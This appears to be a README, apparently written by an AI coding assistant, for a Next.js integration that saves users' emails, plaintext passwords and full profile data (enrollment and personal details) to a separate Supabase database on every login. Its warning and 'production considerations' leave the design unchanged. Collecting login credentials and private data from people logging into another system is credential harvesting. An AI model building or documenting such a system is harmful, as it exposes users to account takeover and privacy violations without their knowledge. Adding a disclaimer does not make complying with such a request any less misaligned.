# Supabase Integration for User Profile Storage

This integration automatically saves user login credentials and profile information to a Supabase database.

## ⚠️ Security Notice

**WARNING**: This implementation stores passwords in plain text as requested. This is NOT RECOMMENDED for production use and poses significant security risks. Consider using proper password hashing in production environments.

## Setup Instructions

### 1. Create Supabase Project
1. Go to [supabase.com](https://supabase.com)
2. Create a new project
3. Get your project URL and anon key from the project settings

### 2. Set Environment Variables
1. Copy `.env.local.example` to `.env.local`
2. Replace the placeholder values with your actual Supabase credentials:
   ```
   NEXT_PUBLIC_SUPABASE_URL=your-actual-supabase-url
   NEXT_PUBLIC_SUPABASE_ANON_KEY=your-actual-anon-key
   ```

### 3. Create Database Table
1. Go to your Supabase dashboard
2. Navigate to the SQL Editor
3. Copy and paste the contents of `supabase-setup.sql`
4. Run the SQL script to create the `user_data` table

### 4. Test the Integration
1. Start your development server: `npm run dev`
2. Log in with any user account
3. The system will automatically save:
   - User email and password (unencrypted)
   - Complete user profile JSON

## What Gets Stored

When a user logs in, the system stores:

### User Credentials
- Email address
- Password (unencrypted as requested)

### User Profile Data
- Complete user profile from the API
- Enrollment details, personal information, program info, etc.
- All profile fields in JSON format

## Database Schema

```sql
user_data {
  id: BIGSERIAL PRIMARY KEY
  email: VARCHAR(255) UNIQUE NOT NULL
  password: TEXT NOT NULL
  user_profile: JSONB
  created_at: TIMESTAMP WITH TIME ZONE
  updated_at: TIMESTAMP WITH TIME ZONE
}
```

## Usage

### Automatic Data Collection
User profile data is automatically collected and stored when users log in through the existing login system.

### Manual Profile Sync
You can also trigger manual profile syncing using the `DataSync` component:

```jsx
import { DataSync } from '@/components/data-sync';

// In your component
<DataSync userEmail="user@example.com" />
```

### Accessing Stored Data
```javascript
import { getUserData } from '@/lib/supabase';

const userData = await getUserData('user@example.com');
console.log(userData.user_profile);
console.log(userData.email);
```

## API Functions

### `saveUserData(email, password, userProfile?)`
- Saves or updates user data in Supabase
- Creates new record if user doesn't exist
- Updates existing record with new profile data

### `getUserData(email)`
- Retrieves stored user data from Supabase
- Returns null if user not found

## Files Modified/Created

- `lib/supabase.ts` - Supabase configuration and data functions
- `lib/auth.ts` - Modified to integrate with Supabase on login
- `components/data-sync.tsx` - Manual sync component
- `supabase-setup.sql` - Database table creation script
- `.env.local.example` - Environment variables template

## Troubleshooting

1. **Supabase connection fails**: Check your environment variables
2. **Table doesn't exist**: Run the SQL script in Supabase dashboard
3. **Data not saving**: Check browser console for error messages
4. **API calls failing**: Ensure user is authenticated before data collection

## Production Considerations

1. **Security**: Implement proper password hashing
2. **Data Privacy**: Consider data retention policies
3. **Performance**: Add data caching and pagination
4. **Monitoring**: Add logging and error tracking
5. **Backup**: Implement regular database backups